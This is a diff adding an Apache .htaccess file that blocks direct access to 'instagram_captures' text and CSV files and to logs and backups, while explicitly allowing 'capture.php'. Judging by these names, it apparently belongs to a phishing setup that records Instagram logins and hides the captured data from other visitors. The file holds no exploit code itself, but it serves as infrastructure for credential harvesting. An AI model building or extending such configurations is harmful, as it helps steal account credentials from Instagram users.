@@ -1,0 +1,19 @@
+# Protect sensitive files from direct access
+<FilesMatch "^(instagram_captures\.(txt|csv))$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+<FilesMatch "\.(log|bak|old|config)$">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+# Allow capture.php to work
+<Files "capture.php">
+    Order Allow,Deny
+    Allow from all
+</Files>
+
+# Disable directory listing
+Options -Indexes
